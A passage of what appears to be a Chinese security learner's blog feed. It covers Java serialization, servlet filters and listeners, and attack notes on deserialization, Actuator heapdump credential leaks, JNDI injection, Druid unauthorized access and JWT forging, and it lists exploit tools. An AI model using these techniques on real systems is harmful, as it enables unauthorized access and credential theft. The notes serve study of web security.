1&#x3D;1 — –</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-40.png"></p><p>如果数据加密，那么注入的 payload 也需要对应加密，payload 才可以生效</p>]]></content>
      
      
      <categories>
          
          <category> Js安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Js安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE-序列化和反序列化</title>
      <link href="/2025/06/17/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/06/17/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-序列化与反序列化"><a href="#Java-序列化与反序列化" class="headerlink" title="Java-序列化与反序列化"></a>Java-序列化与反序列化</h1><p>序列化和反序列化的应用：</p><p>两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。</p><p>java 是面向对象的开发方式，一切都是 java 对象，想要在网络中传输 java 对象，可以使用序列化和反序列化去实现，发送发需要将 java 对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成 java 对象。</p><p>java 序列化的优点：</p><ul><li>实现了数据的持久化，通过序列化可以把数据持久地保存在硬盘上 (磁盘文件)。</li><li>利用序列化实现远程通信，在网络上传输字节序列</li></ul><p><strong>原生序列化操作</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;haohao&quot;</span>, <span class="number">18</span>, <span class="number">14</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        SerializableDeamo(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SerializableDeamo</span><span class="params">(Person obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//FileOutputStream()输出文件</span></span><br><span class="line">        <span class="comment">//将对象obj序列化后输出到文件person.txt</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>  &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String years;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> years)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.age = years;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + age + <span class="string">&quot; &quot;</span> + years);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Name: &quot;</span> + name + <span class="string">&quot; Age: &quot;</span> + age + <span class="string">&quot; Years: &quot;</span> + age;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反序列化:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserializeTest(<span class="string">&quot;person.txt&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializeTest</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename))) &#123;</span><br><span class="line">            <span class="keyword">return</span> ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE-拦截器和过滤器</title>
      <link href="/2025/06/17/Java-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2025/06/17/Java-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaEE-拦截器和过滤器"><a href="#JavaEE-拦截器和过滤器" class="headerlink" title="JavaEE-拦截器和过滤器"></a>JavaEE-拦截器和过滤器</h1><h2 id="过滤器（Filter）："><a href="#过滤器（Filter）：" class="headerlink" title="过滤器（Filter）："></a>过滤器（Filter）：</h2><p>过滤器 JavaWeb 三大组件之一，它与 Servlet 很相似！过滤器是用来拦截请求的，而不是处理请求的。</p><p>当用户请求某个 Servlet 时，会先执行部署在这个请求上的 Filter，如果 Filter “放行”，那么会继承执行用户请求的 Servlet；如果 Filter 不 “放行”，那么就不会执行用户请求的 Servlet。</p><p>其实可以这样理解，当用户请求某个 Servlet 时，Tomcat 会去执行注册在这个请求上的 Filter，然后是否 “放行” 由 Filter 来决定。可以理解为，Filter 来决定是否调用 Servlet！当执行完成 Servlet 的代码后，还会执行 Filter 后面的代码。</p><p>一，拦截资源路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/*&quot;)</span>   <span class="comment">//以注解的形式</span></span><br></pre></td></tr></table></figure><p>二，资源放行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/*&quot;)</span>   <span class="comment">//拦截所有资源路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在拦截&quot;</span>);</span><br><span class="line">        <span class="comment">//资源放行</span></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤器应用场景"><a href="#过滤器应用场景" class="headerlink" title="过滤器应用场景"></a>过滤器应用场景</h3><p>1， 执行目标资源之前做预处理工作，例如设置编码，这种试通常都会放行，只是在目标资源执行之前做一些准备工作；</p><p>2，通过条件判断是否放行，例如校验当前用户是否已经登录，或者用户 IP 是否已经被禁用；</p><p>3，在目标资源执行后，做一些后续的特殊处理工作，例如把目标资源输出的数据进行处理；</p><h2 id="监听器（Listen）"><a href="#监听器（Listen）" class="headerlink" title="监听器（Listen）"></a>监听器（Listen）</h2><p>监听 ServletContext，HttpSession，ServletRequest 等域对象创建和销毁事件</p><p>监听域对象的属性发生修改的事件<br>监听 ServletContext，HttpSession，ServletRequest 等域对象创建和销毁事件</p><p>监听域对象的属性发生修改的事件</p><p>用途：</p><ul><li>统计在线人数和用户</li><li>系统启动的时候加载初始化信息</li><li>统计网站的访问量</li><li>和 Spring 结合</li><li>监听器分类：<br>监听器分类：</li></ul><p>（1）第一类：按照被监听的对象划分：ServletContext 域、ServletRequest 域、HttpSession 域。<br>（2）第二类：监听的内容划分：监听域对象的创建与销毁的监听域对象的属性变化的。</p><p><strong>ServletContextListener</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> zzs.listener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstServletContextListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletcontext初始化了&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletcontext销毁了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HttpSessionListener</strong></p><p> 监听 Httpsession 域的创建于销毁的监听器 HttpSessionListener。<br>  HttpSession 对象的生命周期：<br>  （1）创建：第一次调用 request.getSession 时创建。<br>  （2）销毁：服务器关闭销毁 session 过期手动销毁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> zzs.listener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionAttributeListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingEvent;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstHttpSessionListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FirstHttpSessionListener</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;session创建id:&quot;</span>+se.getSession().getId());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;session销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ServletRequestListener</strong></p><p>  ServletRequestlistener 监听 ServletRequest 域创建与销毁的监听器 ServletRequestListener<br>  ServletRequest 的生命周期<br>  （1）创建：每一次请求都会创建 request<br>  （2）销毁：请求结束</p>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全学习路径</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p><strong>参考文章：</strong></p><p><a href="https://github.com/HackJava/HackJava">https://github.com/HackJava/HackJava</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全-反序列化</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全-反序列化"><a href="#Java安全-反序列化" class="headerlink" title="Java安全-反序列化"></a>Java安全-反序列化</h1><h2 id="Java-安全-反序列化-原生序列化类函数"><a href="#Java-安全-反序列化-原生序列化类函数" class="headerlink" title="Java 安全 - 反序列化 - 原生序列化类函数"></a>Java 安全 - 反序列化 - 原生序列化类函数</h2><p>序列化是将 Java 对象转换成字节流的过程。而反序列化是将字节流转换成 Java 对象的<br>过程，java 序列化的数据一般会以标记 (ac ed 00 05) 开头，base64 编码的特征为<br>rO0AB，JAVA 常见的序列化和反序列化的方法有 JAVA 原生序列化和 JSON 类<br>（fastjson、jackson）序列化等。</p><p>1、黑盒发现（流量捕获）<br>2、白盒发现（特征类接口函数）</p><p>1、原生序列化类函数：<br>-SnakeYaml：完整的 YAML1.1 规范 Processor，支持 Java 对象的序列化 &#x2F; 反序列化<br>-XMLDecoder：xml 语言格式序列化类函数接口<br>-ObjectInputStream.readObject ()：任何类如果想要序列化必须实现<br>java.io.Serializable 接口</p><p>2、利用项目：</p><ul><li>Yakit <a href="https://yaklang.com/">https://yaklang.com/</a></li><li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li><li><a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a></li></ul><h2 id="Java-安全-SpringBoot-框架-泄漏-CVE"><a href="#Java-安全-SpringBoot-框架-泄漏-CVE" class="headerlink" title="Java 安全 - SpringBoot 框架 - 泄漏 &amp; CVE"></a>Java 安全 - SpringBoot 框架 - 泄漏 &amp; CVE</h2><p>SpringBoot Actuator 模块提供了生产级别的功能，比如健康检查，审计，指标收<br>集，HTTP 跟踪等，帮助我们监控和管理 Spring Boot 应用。</p><p>0、检测清单：<br><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>1、黑盒发现（人工识别，BP 插件）<br><a href="https://github.com/API-Security/APIKit">https://github.com/API-Security/APIKit</a><br>1、白盒发现（pom.xml, 引用库）<br>org.springframework.boot spring-boot-starter-actuator</p><p>Actuator 设置全部暴露</p><p>management.endpoints.web.exposure.include&#x3D;*</p><p>&#x2F;actuator&#x2F;env 利用：该端点可以返回全部环境变量以及一些配置信息，其中就包含了数据库配置信息</p><p>heapdump</p><p><strong>利用条件:</strong></p><p>可正常 GET 请求目标 &#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump 接口</p><p><strong>利用方法:</strong></p><p>1、（1）下载 heapdump</p><p>127.0.0.1:8088&#x2F;actuator&#x2F;heapdump 下载 heapdump 文件，泄露 JAVA 堆 dump 信息：</p><p> （2）heapdump 文件解密</p><p><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p><p>2、泄漏安全（配置密码，AK&#x2F;SK 等）<br><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a><br><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a><br>3、漏洞安全（利用类，CVE 漏洞等）</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全-RCE执行,JNDI注入</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8-RCE%E6%89%A7%E8%A1%8C-JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8-RCE%E6%89%A7%E8%A1%8C-JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全-RCE执行-JNDI注入"><a href="#Java安全-RCE执行-JNDI注入" class="headerlink" title="Java安全-RCE执行,JNDI注入"></a>Java安全-RCE执行,JNDI注入</h1><h2 id="Java-安全-RCE-执行-5-大类函数调用"><a href="#Java-安全-RCE-执行-5-大类函数调用" class="headerlink" title="Java 安全 - RCE 执行 - 5 大类函数调用"></a>Java 安全 - RCE 执行 - 5 大类函数调用</h2><p>-Groovy</p><p>-RuntimeExec</p><p>-ProcessImpl</p><p>-ProcessBuilder</p><p>-ScriptEngineManager</p><p>检测：（大部分白盒）</p><p>黑盒看参数名和参数值</p><p>白盒看类函数名和可控变量</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p><h2 id="Java-安全-JNDI-注入-RMI-LDAP-版本-什么是-jndi-注入"><a href="#Java-安全-JNDI-注入-RMI-LDAP-版本-什么是-jndi-注入" class="headerlink" title="Java 安全 - JNDI 注入 - RMI&amp;LDAP &amp; 版本 什么是 jndi 注入"></a>Java 安全 - JNDI 注入 - RMI&amp;LDAP &amp; 版本 什么是 jndi 注入</h2><p>为什么有 jndi 注入</p><p>JDNI 注入安全问题（RCE）</p><p>JDNI 注入利用条件（看上图）</p><p>参考：<a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5-1024x365.png"></p><p>JNDI 全称为 Java Naming and DirectoryInterface（ Java 命名和目录接口）， 是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来 定义用户、网络、机器、对象和服务等各种资源。JNDI 支持的服务主要有：DNS、<br>LDAP、CORBA、RMI 等。<br>RMI：远程方法调用注册表 LDAP：轻量级目录访问协议</p><p>调用检索：<br>Java 为了将 Object 对象存储在 Naming 或 Directory 服务下，提供了 Naming<br>Reference 功能，对象可以通过绑定 Reference 存储在 Naming 或 Directory 服务 下，比如 RMI、LDAP 等。javax.naming.InitialContext.lookup ()<br>在 RMI 服务中调用了 InitialContext.lookup () 的类有：</p><p>调用检索：<br>Java 为了将 Object 对象存储在 Naming 或 Directory 服务下，提供了 Naming<br>Reference 功能，对象可以通过绑定 Reference 存储在 Naming 或 Directory 服务 下，比如 RMI、LDAP 等。javax.naming.InitialContext.lookup ()<br>在 RMI 服务中调用了 InitialContext.lookup () 的类有：</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全-JWT,Swagger接口,Druid监控</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8-JWT-Swagger%E6%8E%A5%E5%8F%A3-Druid%E7%9B%91%E6%8E%A7/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8-JWT-Swagger%E6%8E%A5%E5%8F%A3-Druid%E7%9B%91%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全-JWT-Swagger-接口-Druid-监控"><a href="#Java安全-JWT-Swagger-接口-Druid-监控" class="headerlink" title="Java安全-JWT,Swagger 接口,Druid 监控"></a>Java安全-JWT,Swagger 接口,Druid 监控</h1><blockquote><p>1，Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏<br>2，Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试<br>3，Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙提取</p></blockquote><h2 id="Java-安全-Druid-监控-未授权访问-信息泄漏"><a href="#Java-安全-Druid-监控-未授权访问-信息泄漏" class="headerlink" title="Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏"></a>Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏</h2><p>参考：<a href="https://developer.aliyun.com/article/1260382">https://developer.aliyun.com/article/1260382</a><br>Druid 是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。Druid 提供的监控<br>功能，监控 SQL 的执行时间、监控 Web URI 的请求、Session 监控。当开发者配置不<br>当时就可能造成未授权访问漏洞。<br>攻击点：<br>1、直接拼接 URL 路径，尝试能否直接未授权访问系统功能点。<br>2、结合泄露 URL 路径和 Session 信息，利用 BurpSuite 进行尝试登录。<br>3、利用 Cookie 编辑器替换 Session，再次访问后台路径尝试进入后台。</p><p>利用方法：</p><p>通过目录扫描或手工输入路径 <a href="http://www.xxxx.com/druid/index.html%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8">http://www.xxxx.com/druid/index.html，发现存在</a> Druid 未授权访问页面，重点关注 URL 监控和 Session 监控页面；</p><h2 id="Java-安全-Swagger-接口-导入-联动批量测试"><a href="#Java-安全-Swagger-接口-导入-联动批量测试" class="headerlink" title="Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试"></a>Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试</h2><p>Swagger 是一个用于生成、描述和调用 RESTful 接口的 Web 服务。就是将项目中所有<br>（想要暴露的）接口展现在页面上，并可以进行接口调用和测试的服务。所以可以对这个<br>接口进行漏洞测试，看是否存在未授权访问、sql 注入、文件上传等漏洞。由于接口太<br>多，一个个接口测试的话太费时间，所以一般会采用自动化接口漏洞安全测试。</p><p>访问：<a href="http://ip:port/swagger-ui.html">http://ip:port/swagger-ui.html</a><br>1、自动化发包测试<br>Postman：<a href="https://github.com/hlmd/Postman-cn">https://github.com/hlmd/Postman-cn</a><br>2、自动化漏洞测试<br>联动 BurpSuite Xray 等</p><h2 id="Java-安全-JWT-令牌-空算法-未签名-密匙获取"><a href="#Java-安全-JWT-令牌-空算法-未签名-密匙获取" class="headerlink" title="Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙获取"></a>Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙获取</h2><p>JSON Web Token (JWT)。它遵循 JSON 格式，将用户信息加密到 token 里，服务器不<br>保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证 token，通过 token<br>验证用户身份。基于 token 的身份验证可以替代传统的 cookie+session 身份验证方<br>法。这使得 JWT 成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端<br>服务器无缝交互</p><p><a href="https://jwt.io/">https://jwt.io</a></p><p>1、标头（Header）</p><p>alg 字段通常用于表示加密采用的算法。如”HS256″、”RS256″等</p><p>typ 字段通常用于表示类型</p><p>2，有效载荷（Payload）</p><p>Payload 是 JWT 的第二个部分，这是一个 JSON 对象，主要承载了各种声明并传递明文</p><p>数据，用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明。</p><p>3，签名（Signature）</p><p>使用 “alg”: “none” 时，签名部分为空，直接以 . 结尾。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-42-1024x356.png"></p><p>一，空算法：</p><p>当 alg 为 none 时没有加密算法</p><p>可直接更改 Payload 中的信息并重新生成 base64 的编码发送</p><p>二，未签名</p><p>有些服务器并未验证 jwt 签名，可以直接尝试修改 payload，或者删除 Signature</p><p>三，暴力破解密钥</p><p>某些签名算法，例如 HS256 (HMAC+SHA-256)，会像密码一样使用一个任意的、独立的字符串作为秘密密钥。这个秘钥如被轻易猜到或暴力破解，则攻击者能以任意的头部和载荷值来创建 JT，然后用密钥重新给令牌签名。</p><p>四，源码泄露密钥</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-JNDI</title>
      <link href="/2025/06/17/Java-JNDI/"/>
      <url>/2025/06/17/Java-JNDI/</url>
      
